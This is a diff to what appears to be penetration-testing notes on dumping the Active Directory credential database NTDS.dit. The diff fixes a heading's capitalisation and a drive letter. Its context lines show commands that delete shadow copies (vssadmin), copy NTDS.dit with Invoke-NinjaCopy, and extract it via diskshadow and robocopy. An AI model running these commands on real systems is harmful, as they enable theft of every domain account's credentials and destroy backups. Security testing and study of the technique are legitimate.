@@ -64,7 +64,7 @@ vssadmin delete shadows /shadow=$ShadowCopyId
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
 ```
 
-### Diskshadow
+### DiskShadow
 The `diskshadow.exe` utility can be used to interface with the Volume Shadow Copy Service.
 ```
 PS C:\Tools> diskshadow.exe
@@ -83,7 +83,7 @@ DISKSHADOW> exit
 
 We can then copy the `NTDS.dit` file directly from the `E:` drive.
 ```
-PS C:\Tools> robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+PS C:\Tools> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 ```
 
 ## 2. Parsing
